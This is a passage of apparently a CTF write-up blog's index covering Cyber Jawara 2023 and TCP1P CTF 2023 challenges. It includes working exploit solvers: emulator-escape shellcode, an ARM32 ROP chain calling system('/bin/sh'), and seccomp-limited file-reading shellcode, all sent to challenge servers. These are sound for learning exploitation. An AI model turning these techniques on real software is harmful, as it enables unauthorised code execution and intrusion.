\"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: \u003chttps://www.gnu.org/software/gdb/bugs/\u003e. Find the GDB manual and other documentation resources online at: \u003chttp://www.gnu.org/software/gdb/documentation/\u003e. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... pwndbg: loaded 151 pwndbg commands and 39 shell commands. Type pwndbg [--shell | --all] [filter] for a list. pwndbg: created $rebase, $ida GDB functions (can be used with print/break) Reading symbols from blink... (No debugging symbols found in blink) ------- tip of the day (disable with set show-tips off) ------- Use GDB's dprintf command to print all calls to given function. E.g. dprintf malloc, \"malloc(%p)\\n\", (void*)$rdi will print all malloc calls pwndbg\u003e Blackbox Testing To do the blackbox testing, I started by creating this very simple assembly code: %use masm _start: nop mov rax, 0x0101010101010101 mov rcx, 0x0202020202020202 mov rdx, 0x0303030303030303 mov rbx, 0x0404040404040404 mov rsi, 0x0505050505050505 mov rdi, 0x0606060606060606 mov r8, 0x0808080808080808 mov r9, 0x0909090909090909 mov r10, 0x0a0a0a0a0a0a0a0a mov r11, 0x0b0b0b0b0b0b0b0b mov r12, 0x0c0c0c0c0c0c0c0c mov r13, 0x0d0d0d0d0d0d0d0d mov r14, 0x0e0e0e0e0e0e0e0e mov r15, 0x0f0f0f0f0f0f0f0f inf_loop: jmp inf_loop The above assembly can be used to observe where the blink stores the emulated registers value. I put an infinite loop at the end so that the program will keep running and we can easily attach a gdb to the blink binary and obser","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:2:1","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Solution Stage 1 \u0026 Stage 2: Find LIBC address \u0026 PIE Base Now that we have OOB access to the libc area, I want to try to leak the PIE base address, because by leaking the PIE base addres, we can calculate the rwx region that we saw before, and then try to put shellcode to it. Observing through the gdb again, I noticed that libc_base-0x001d10 contains the PIE base address. pwndbg\u003e search -8 0x5608cdaa0000 Searching for value: b'\\x00\\x00\\xaa\\xcd\\x08V\\x00\\x00' [anon_7f2f50040] 0x7f2f500412f0 0x5608cdaa0000 ld-linux-x86-64.so.2 0x7f2f503932e0 0x5608cdaa0000 ld-linux-x86-64.so.2 0x7f2f50393638 0x5608cdaa0000 pwndbg\u003e hex(-0x7f2f500412f0+0x7f2f50043000) +0000 0x001d10 Let’s start crafting the stage_2 of our payload, which is to get the PIE base address %use masm _start: nop mov rax, 0x4141414141414141 ; just for debugging purpose, to easily find the emulated registers value stage_1: ; find libc base address mov r13, 0x03010102464c457f; set r13 to libc first 8 bytes mov r12, QWORD PTR [rsp]; set r12 to rsp content cmp r12, r13 ; compare it je stage_2 ; if it is equals, jump to stage_2 add rsp, 8 ; else, increase the rsp by 8 jmp stage_1 stage_2: ; find pie base address mov r9, rsp ; copy libc base to r9 sub r9, 0x001d10 ; now r9 contains pie_base mov r9, QWORD PTR [r9] ; set r9 to r9 content, which is pie_base stage_3: ; for now, set stage_3 to infinite loop first jmp stage_3 Compile and run it again, and if you check in the gdb, our r9 now points to the PIE base of blink. pwndbg\u003e search -8 0x4141414141414141 Searching for value: b'AAAAAAAA' [anon_00400] 0x401003 0x4141414141414141 ('AAAAAAAA') [anon_55a7647a3] 0x55a7647a3048 mov rsi, rbx /* 0x4141414141414141 */ [heap] 0x55a76d86c898 'AAAAAAAA' [heap] 0x55a76d86ce9c 0x4141414141414141 ('AAAAAAAA') [heap] 0x55a76d86cec3 0x4141414141414141 ('AAAAAAAA') [heap] 0x55a76d86ced8 'AAAAAAAA' pwndbg\u003e x/50gx 0x55a76d86c898-0x28 0x55a76d86c870: 0x0000000000000000 0x0000000000005671 0x55a76d86c880: 0x0000000000401033 0xf000120200000202 0x55a76d86c890: 0x0000000000000000 0x4141414141414141 0x55a76d86c8a0: 0x0000000000000000 0x0000000000000000 0x55a76d86c8b0: 0x0000000000000000 0x00007fcde3cd3000 0x55a76d86c8c0: 0x0000000000000000 0x0000000000000000 0x55a76d86c8d0: 0x0000000000000000 0x0000000000000000 0x55a76d86c8e0: 0x000055a764770000 0x0000000000000000 0x55a76d86c8f0: 0x0000000000000000 0x03010102464c457f 0x55a76d86c900: 0x03010102464c457f 0x0000000000000000 pwndbg\u003e pie Calculated VA from /app/blink = 0x55a764770000 Now that we have pie base, let’s start crafting the stage_3, which is writing shellcode to the rwx region of blink. Stage 3: Write shellcode to RWX region Observe that the rwx region has constant offset from the pie base, which is 0x033000. I just choose a random offset, and I decided that I will put my shellcode at pie_base+0x033000+0x150. Now the question, what should be our shellcode? Observe that in runner.py, it runs the blink with subprocess, and based on my experience, we can’t spawn a shell with it. So, I decided to craft a shellcode that will do execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"cat /f*\"]), which will directly print the flag if it is got executed. Let’s modify our script to put this shellcode to the rwx region. from pwn import p64, u64, p32, u32 from pwn import * import os context.arch = 'amd64' # execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"cat /f*\"]) cat_flag_sc = asm( ''' mov rsi, 0x68732f6e69622f push rsi mov rdi, rsp mov rsi, 0x2a662f20746163 push rsi mov r10, rsp mov rsi, 0x632d push rsi mov r11, rsp push 0x0 push r10 push r11 push rdi mov rsi, rsp xor rdx, rdx mov rax, 0x3b syscall ''') shellcode_payload = '' for i in range(0, len(cat_flag_sc), 8): raw_sc_8 = hex(u64(cat_flag_sc[i:i+8].ljust(8, b'\\x00'))) shellcode_payload += f''' mov r12, {raw_sc_8} mov QWORD PTR [r9], r12 add r9, 8''' sc = f''' %use masm _start: nop mov rax, 0x4141414141414141 ; just for debugging purpose, to easily find the emulated registers value stage_1: ; find libc base address mov r13, 0x03010102464","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:2:2","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"sorearm Description cant pwn with my sorearm 137.184.6.25 17002 ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:3:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary called labyrinth, which is an ARM32 binary. Let’s disassemble the binary and take a closer look. main EXPORT main main var_20= -0x20 var_1C= -0x1C PUSH {R7,LR} SUB SP, SP, #0x20 ADD R7, SP, #0 STR R0, [R7,#0x20+var_1C] STR R1, [R7,#0x20+var_20] BL init ADD.W R3, R7, #8 MOV.W R2, #0x100 ; nbytes MOV R1, R3 ; buf MOVS R0, #0 ; fd BLX read MOVS R3, #0 MOV R0, R3 ADDS R7, #0x20 ; ' ' MOV SP, R7 POP {R7,PC} This is ARM architecture assembly, and looking through this small assembly code, we can observe that there is a buffer overflow bug, where the stack size of the main function is 0x20, but we can read 0x100 bytes to SP+0x8. It is very straightforward that we need to perform ROP with this buffer overflow to spawn a shell, so let’s try to find some good gadgets that we can use. Looking through the other available functions, we can see that there are two interesting functions called a and b. a EXPORT a a PUSH {R7,LR} ADD R7, SP, #0 LDR R3, =(binsh - 0x10542) ADD R3, PC ; binsh LDR R3, [R3] ; \"/bin/sh\" MOV R0, R3 ; s BLX puts NOP POP {R7,PC} b EXPORT b b PUSH {R7,LR} ADD R7, SP, #0 LDR R3, =(command - 0x1055A) ADD R3, PC ; command LDR R3, [R3] ; \"id\" MOV R0, R3 ; command BLX system NOP POP {R7,PC} Based on these two functions, we can see that the binary already provide us good gadgets that we can use, which are: The binary already has a sequence of instructions that can call system (which is in b). The binary already has a /bin/sh string that we can use as the parameter for the above gadget. Using this information that we have gathered, we can start to craft our solution. ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:3:1","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Solution First, let’s start by calculating the offset that we need to use to control the instruction pointer. Observe that in the main function: We can read buffer starting from sp+8 There is an extra POP {R7, PC} before the main function returns. Remember that this is a 32-bit binary, so the POP will only consume 4 bytes. The stack size is 0x20, and based on those 2 pieces of information, we need to fill the buffer with data of length (0x20-0x8)+0x4 = 0x1c. After filling the buffer with 0x1c data, the next data that we send will overwrite the next instruction pointer. To spawn a shell, we need to call system(\"/bin/sh\"). In ARM32, the first parameter of the function needs to be put in the R0 register. Observe that in the b function, we already have this gadget: MOV R0, R3 ; command BLX system And using the help of ROPGadget, we can see that there is a good gadget that can set the R3 value. ROPgadget --binary ./chall --only \"pop\" Gadgets information ============================================================ 0x000103bc : pop {r3, pc} Unique gadgets found: 1 We can use this gadget to fill the r3 with the /bin/sh address, then use the system gadget to spawn the shell. Below is the solver that I used to solve the challenge. from pwn import * r = remote('137.184.6.25', 17002) binsh = 0x0001062c # binsh str pop_r3_pc = 0x000103bc # pop {r3, pc} system = 0x1055a # mov r0, r3; blx system puts = 0x10538 payload = b'a'*0x1c payload += p32(pop_r3_pc) payload += p32(binsh) payload += p32(system+1) r.send(payload) r.interactive() Notice that I incremented the system gadget address by 1, because somehow there is an alignment in ARM32 CPU instruction which sometimes requires us to shift the address of the gadget a little up or down. Flag: CJ2023{6fb2ad4fe1019c980a3d67b6754733ec} Crypto ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:3:2","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"daruma Description Software audit is so cringe bro, why don’t we do paper audit instead nc 178.128.102.145 50001 ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:4:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file called challenge.py which is the source code of the server. import random from Crypto.Util.number import * class AECF: def __init__(self, p=None, q=None, g=2): p = p or getPrime(512) q = q or getPrime(512) n = p * q self.g = g self.n2 = n**2 self.totient = n * (p - 1) * (q - 1) while True: self.k = random.randrange(2, self.n2 - 1) if GCD(self.k, self.n2) == 1: break while True: self.e = random.randrange(2, self.totient - 1) if GCD(self.e, self.totient) == 1: break self.d = inverse(self.e, self.totient) self.l = random.randrange(1, self.n2 - 1) self.beta = pow(self.g, self.l, self.n2) def public_key(self): return (self.n2, self.e, self.beta) def private_key(self): return (self.d, self.l) def encrypt_and_sign(self, plaintext, public): n2, e, beta = public m = bytes_to_long(plaintext) r = pow(self.k, e, n2) % n2 s = m * self.k * pow(beta, self.l, n2) % n2 return r, s def decrypt_and_verify(self, r, s, beta): m = s * inverse(pow(r, self.d, self.n2), self.n2) * \\ inverse(pow(beta, self.l, self.n2), self.n2) % self.n2 return long_to_bytes(m) FLAG = open('flag.txt', 'rb').read() bob = AECF() enc_flag = bob.encrypt_and_sign(FLAG, bob.public_key()) assert bob.decrypt_and_verify(*enc_flag, bob.beta) == FLAG print(\"Encrypted flag:\", enc_flag) print(\"Bob public key:\", bob.public_key()) for _ in range(2): print() print(\"=\"*40) try: n = int(input(\"Your public modulus: \")) if n.bit_length() \u003c 2000 or n.bit_length() \u003e 10000 or isPrime(n): print(\"Insecure modulus\") break e = int(input(\"Your public e: \")) beta = int(input(\"Your public beta: \")) message = input(\"Message you want to encrypt and sign: \") c = bob.encrypt_and_sign(message.encode(), (n, e, beta)) print(\"Your ciphertext:\", c) except Exception as e: print(e) break The author tries to implement the encryption scheme proposed in the attached paper, and tries to show the vulnerability of the scheme. Let’s try to understand the implemented code first. First, the code initialize the encryption class, which will generate some parameters, where the public key is tuple of $(n^2, e, \\beta)$ Second, the code will try to encrypt and sign with the Bob’s public key, where the value of $r$ and $s$ is calculated like below: $$ r = k^e \\mod n^2 \\\\ s = (m.k.(\\beta^l \\mod n^2)) \\mod n^2 $$ where: $m$ is the message. $n^2$ is the squared modulus ($p^2q^2$). $k$ and $l$ are random integers in the range of $n^2$. Then, the code will give us the ($r$, $s$, $n^2$, $e$, $\\beta$) values. After that, the code will give us two tries to try encrypt_and_sign, where we can send our own: public key message Based on this information, we need to somehow decrypt the encrypted flag that the code gave us. ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:4:1","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Solution Let’s try to take a closer look in the equation of the encryption: $$ s = (m.k.(\\beta^l \\mod n)) \\mod n $$ In order to recover $m$, missing values that we need to recover are $k$ and $l$. So, the target here is given the two tries that the server gave to us, we need to somehow recover those values. Recovering $k$ is easy. Observe that if we send a huge public modulus, and use $e=1$, the $r$ value that is returned by the server will be equivalent to value $k$. Now, that we know $k$, with the $s$ that we get from the server during our own trial, we can recover the value of $(\\beta^l \\mod n)$, because: $$ (\\beta^l \\mod n) = s.k^{-1}.m^{-1} \\mod n $$ So now, to recover $l$, this is a classic discrete logarithm problem. Remember that we can select our own $n$ and $\\beta$. We can simply use weak $n$, so that the discrete logarithm can be computed in a short time. After we recover $k$ and $l$, we can easily recover the flag based on the below equation: $$ m = s.k^{-1}.(\\beta^l \\mod n)^{-1} \\mod n $$ Below is the solver that I used to solve the challenge (sage file): from pwn import * from Crypto.Util.number import * r = remote('178.128.102.145', int(50001)) r.recvuntil(b': ') _r, _s = eval(r.recvline().strip()) r.recvuntil(b': ') n2, e, beta = eval(r.recvline().strip()) my_n = 3637793**100 my_e = 1 my_beta = 3 m = 97 r.sendlineafter(b'modulus: ', str(my_n).encode()) r.sendlineafter(b'e: ', str(my_e).encode()) r.sendlineafter(b'beta: ', str(my_beta).encode()) r.sendlineafter(b'sign: ', chr(m).encode()) r.recvuntil(b': ') out = eval(r.recvline().strip()) k = Integer(out[0]) s = Integer(out[1]) pow_beta = (((s*inverse_mod(k, my_n)) % my_n)*inverse_mod(m, my_n)) % my_n l = discrete_log(pow_beta, Mod(my_beta, my_n)) flag = (((_s*inverse_mod(k, n2)) % n2)*inverse_mod(Integer(pow(beta, l, n2)), n2)) % n2 print(long_to_bytes(int(flag))) Flag: CJ2023{dont_roll_your_own_crypto_part_xxxxx_idk} ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:4:2","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"chokaro Description Fyi, QR code is just NxN matrix in GF(2) ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:5:0","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a file called encrypt.py and mixed.png. Let’s start by checking the encryption file. import random import numpy as np import qrcode from PIL import Image def mix(a,b,arr): mod = len(arr) narr = np.zeros(shape=(mod,mod), dtype=bool) for (x,y), element in np.ndenumerate(arr): nx = (x + y * a) % mod ny = (x * b + y * (a * b + 1)) % mod narr[nx][ny] = element return narr def rescale(arr): mod = len(arr) final_arr = np.zeros(shape=(mod*10,mod*10), dtype=bool) for i in range(mod): for j in range(mod): final_arr[i*10:(i+1)*10, j*10:(j+1)*10] = arr[i][j] return final_arr FLAG = open('flag.txt', 'r').read() qr = qrcode.QRCode(border=0) qr.add_data(FLAG) qr.make(fit=True) mat = np.array(qr.get_matrix(), dtype=bool) a = random.randrange(1, len(mat)-1) b = random.randrange(1, len(mat)-1) scrambled = mat for _ in range(22): scrambled = mix(a,b,scrambled) scrambled = rescale(scrambled) img = Image.fromarray(scrambled) img.save('mixed.png') To summarize, the code start by creating a QR code that can be decoded to the FLAG. Then, the code convert the QR code into matrix of boolean. The code generate two random number $a$ and $b$, then it try to mix the matrix 22 times with the $a$ and $b$ values. The mix function itself was trying to scramble the array by doing some linear equations with the index like below: $$ nx = (x + y * a) \\mod \\text{len(arr)} \\\\ ny = (x * b + y * (a * b + 1)) \\mod \\text{len(arr)} $$ After that, it will try to rescale the image. Based on this scheme, the target is to recover the mixed.png and get the correct QRCode image. ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:5:1","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":"Solution We can see that the value of $a$ and $b$ are very small, which means that it is bruteforce-able. Observe that if we can guess the value of $a$ and $b$, the mix function will become two linear equations with two unknowns ($x$, $y$) under modulo $len(arr)$. We can simply: unscale the mixed.png for each mix iteration, try to recover the original value of $x$ and $y$ by solving the linear equations. Below is the script that I used to solve the challenge (sage). This script will basically generate a lot of images based on the pair of $a$ and $b$ that we brute-forced. We just need to find one image which is the QRCode of the FLAG. import numpy as np from PIL import Image def unscale(final_arr): mod = len(final_arr)//10 arr = np.zeros(shape=(mod, mod), dtype=bool) for i in range(mod): for j in range(mod): arr[i][j] = final_arr[i*10, j*10] return arr.astype(int).tolist() def unmix(a, b, arr): mod = len(arr) R = IntegerModRing(mod) real_mat = [[0 for _ in range(mod)] for _ in range(mod)] for i in range(mod): for j in range(mod): M = Matrix(R, [ [1, a], [b, (a*b+1)], ]) target = vector(R, [i, j]) x, y = M.solve_right(target) real_mat[x][y] = arr[i][j] return real_mat def rescale(arr): mod = len(arr) final_arr = np.zeros(shape=(mod*10,mod*10), dtype=bool) for i in range(mod): for j in range(mod): final_arr[i*10:(i+1)*10, j*10:(j+1)*10] = arr[i][j] return final_arr image = Image.open(\"mixed.png\") image_array = np.array(image) for a in range(1, (len(image_array)//10) - 1): for b in range(1, (len(image_array)//10) - 1): scrambled = unscale(image_array) for _ in range(22): scrambled = unmix(a, b, scrambled) ori_arr = np.array(scrambled, dtype=bool) ori_arr = rescale(ori_arr) img = Image.fromarray(ori_arr) img.save(f'result/{a}-{b}-flag.png') print(f'Saved to: result/{a}-{b}-flag.png') After running the script for a while, parameters $a=10$ and $b=18$ produce the correct QRCode image. Flag: CJ2023{small_exercise_to_start_your_day_:D} Social Media Follow me on twitter ","date":"Dec 03, 2023","objectID":"/posts/cyber-jawara-2023/:5:2","tags":["Writeup","Cyber Jawara","2023","pwn","heap","tcache","fastbin dup","OOB","ROP","arm32","crypto","web"],"title":"Cyber Jawara 2023 Writeup","uri":"/posts/cyber-jawara-2023/"},{"categories":null,"content":" TCP1P CTF 2023 Last weekend, I participated in TCP1P CTF 2023 with my team, Fidethus. We feel honored to secure the 4th place despite being a team of just three. Kudos to my teammates, Djavaa and Berlian! Below are some write-ups of the challenges from the CTF. We secured the 4th place! Pwn ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:0:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Bluffer Overflow Description Author: rennfurukawa Maybe it’s your first time pwning? Can you overwrite the variable? nc ctf.tcp1p.com 17027 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:1:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were given a source code file named chall.c. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e char buff[20]; int buff2; void setup(){ setvbuf(stdin, buff, _IONBF, 0); setvbuf(stdout, buff, _IONBF, 0); setvbuf(stderr, buff, _IONBF, 0); } void flag_handler(){ FILE *f = fopen(\"flag.txt\",\"r\"); if (f == NULL) { printf(\"Cannot find flag.txt!\"); exit(0); } } void buffer(){ buff2 = 0; printf(\"Can you get the exact value to print the flag?\\n\"); printf(\"Input: \"); fflush(stdout); gets(buff); if (buff2 \u003e 5134160) { printf(\"Too high!\\n\\n\"); } else if (buff2 == 5134160){ printf(\"Congrats, You got the right value!\\n\"); system(\"cat flag.txt\"); } else { printf(\"Sad, too low! :(, maybe you can add *more* value 0_0\\n\\n\"); } printf(\"\\nOutput : %s, Value : %d \\n\", buff, buff2); } int main(){ flag_handler(); setup(); buffer(); } Observed that there’s a bug in the gets(buff) line of code, where we can input a string of any length. The objective here is to fill the buff2 value with 5134160 so the program prints the flag (note that the number 5134160 is a numerical representation of the word PWN). Since buff is merely a char array with a size of 20, it implies that by inputting 'a'*20 + 'PWN', the buff2 value would be overwritten. nc ctf.tcp1p.com 17027 Can you get the exact value to print the flag? Input: aaaaaaaaaaaaaaaaaaaaPWN Congrats, You got the right value! TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca} Flag: TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca} ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:1:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"message Description Author: gawrgare What do you want to say to me? nc ctf.tcp1p.com 8008 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:2:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution This time, we were only given a binary named chall. First, let’s disassemble this binary. int __cdecl main(int argc, const char **argv, const char **envp) { void *v4; // [rsp+0h] [rbp-10h] void *v5; // [rsp+8h] [rbp-8h] v4 = malloc(0x150uLL); v5 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL); setup(); seccomp_setup(); if ( v5 != (void *)-1LL \u0026\u0026 v4 ) { puts(\"Anything you want to tell me? \"); read(0, v4, 0x150uLL); memcpy(v5, v4, 0x1000uLL); ((void (*)(void))v5)(); free(v4); munmap(v5, 0x1000uLL); return 0; } else { perror(\"Allocation failed\"); return 1; } } In summary, it’s clear that we can provide input in the form of shellcode with a maximum length of 0x150. However, there’s seccomp in place, limiting the syscalls that we can invoke. To find out what syscalls are allowed, let’s use seccomp-tools first. seccomp-tools dump ./chall line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x000000d9 if (A != getdents64) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL There are 4 allowed syscalls, namely read, write, open, and getdents64. First, let’s identify the name of the flag file using getdents64. We need to create shellcode that will execute the following instructions: open('./', os.O_DIRECTORY) getdents64(3, 'rsp', 0x100) write(1, 'rsp', 0x100) To simplify the exploitation, we can use pwntools. Here is the script I used: from pwn import * import os context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") r = remote('ctf.tcp1p.com', 8008) payload = asm(shellcraft.open('./', os.O_DIRECTORY)) payload += asm(shellcraft.getdents64(3, 'rsp', 0x100)) payload += asm(shellcraft.write(1, 'rsp', 0x100)) r.send(payload) r.interactive() Anything you want to tell me? Y`0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00.\\x00\\x00W`0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00..\\x00\\x00`0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt\\x00\\xdb39`0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00run_challenge.sh\\x00\\x00\\x00_0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00chall\\x00\\xfc \\xfe\\xf5_0\\x00\\x00\\x06\\x00\\x00\\x00\\x18\\x04in\\x00\\x00\\x00\\x00 We can see that the flag’s filename is flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt. Let’s promptly create new shellcode to read that flag using a combination of open-read-write. from pwn import * import os context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") r = remote('ctf.tcp1p.com', 8008) payload = asm(shellcraft.open('flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt')) payload += asm(shellcraft.read(3, 'rsp', 0x100)) payload += asm(shellcraft.write(1, 'rsp', 0x100)) r.send(payload) r.interactive() Anything you want to tell me? TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??}6ee90.txt\\x00\\x00\\x00\\x00\\xf4\\xb8=V\\x00\\xa0\\xe22=V\\x00\\x00\\xbdm\"\\x7f\\x00\\x00\\x00\\x00\\x00\\xed\\x97m\"\\x7f\\x00\\x00\\x00\\x00\\x00\\xb7\\xf3\\xb8=V\\x00\\x00\\x00\\x00\\x00\\xed\\xaeR\\xff\\x7f\\x00\\x00\\x00\\x00\\x00\\x83IwLG\\xc2\\xa1\\x18\\xaeR\\xff\\x7f\\x00\\xb7\\xf3\\xb8=V\\x00X\\x1d\\x15V\\x00@\\xb0\\xbdm\"\\x7f\\x00\\x83IU\\x94\\x1a\\xff^\\x83I\\xfd\\x96hE_\\x00\\x00\\x00\\x00\\x00 Flag: TCP1P{I_pr3fer_to_SAY_ORGW_rather_th4n_OGRW_d0nt_y0u_th1nk_so??} ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:2:1","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"babyheap Description Author: HyggeHalcyon let’s see how well you understand the heap nc ctf.tcp1p.com 4267 ","date":"Oct 15, 2023","objectID":"/posts/tcp1p-ctf-2023/:3:0","tags":["Writeup","TCP1P","2023","pwn","blockchain"],"title":"TCP1P CTF 2023","uri":"/posts/tcp1p-ctf-2023/"},{"categories":null,"content":"Solution We were given a binary called chall. Let’s disassemble it first. main int __cdecl main(int argc, const char **argv, const char **envp) { setup(argc, argv, envp); while ( 1 ) { switch ( (unsigned int)menu() ) { case 1u: create(); break; case 2u: delete(); break; case 3u: view(); break; case 4u: read_flag(); break; case 5u: puts(\"[*] exiting...\"); exit(0); default: puts(\"[!] unknown choice\"); break; } } } There are four types of menus available. Let’s explore each of it first. create unsigned __int64 create() { int v1; // [rsp+8h] [rbp-48h] int n; // [rsp+Ch] [rbp-44h] char s[40]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v4; // [rsp+38h] [rbp-18h] v4 = __readfsqword(0x28u); printf(\"Index: \"); fgets(s, 32, stdin); v1 = atoi(s); if ( v1 \u003e 0 \u0026\u0026 v1 \u003c= 10 ) { if ( *((_QWORD *)\u0026user_chunk + v1 - 1) ) { puts(\"[!] oops, chunk already occupied\"); return v4 - __readfsqword(0x28u); } printf(\"Size: \"); fgets(s, 32, stdin); n = atoi(s); if ( n \u003e 15 \u0026\u0026 n \u003c= 256 ) { *((_QWORD *)\u0026user_chunk + v1 - 1) = malloc(n); printf(\"Content: \"); fgets(*((char **)\u0026user_chunk + v1 - 1), n, stdin); puts(\"[*] creation success\"); return v4 - __readfsqword(0x28u); } } puts(\"[!] sorry can't do that\"); return v4 - __readfsqword(0x28u); } In this menu, we can create a chunk, where the creation process will allocate memory using malloc based on the size we provide. Then, we can fill in the value in that chunk through fgets. view unsigned __int64 view() { int v1; // [rsp+Ch] [rbp-34h] char s[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index: \"); fgets(s, 32, stdin); v1 = atoi(s); if ( v1 \u003e 0 \u0026\u0026 v1 \u003c= 10 ) { if ( *((_QWORD *)\u0026user_chunk + v1 - 1) ) printf(\"[*] Data: %s\\n\", *((const char **)\u0026user_chunk + v1 - 1)); else puts(\"[!] chunk is empty\"); } else { puts(\"[!] sorry can't do that\"); } return v3 - __readfsqword(0x28u); } With this menu, we can view the contents of the chunk we want based on the index we input. delete unsigned __int64 delete() { int v1; // [rsp+Ch] [rbp-34h] char s[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"Index: \"); fgets(s, 32, stdin); v1 = atoi(s); if ( v1 \u003e 0 \u0026\u0026 v1 \u003c= 10 ) { free(*((void **)\u0026user_chunk + v1 - 1)); puts(\"[*] deletion success\"); } else { puts(\"[!] sorry can't do that\"); } return v3 - __readfsqword(0x28u); } This menu is used to delete a chunk 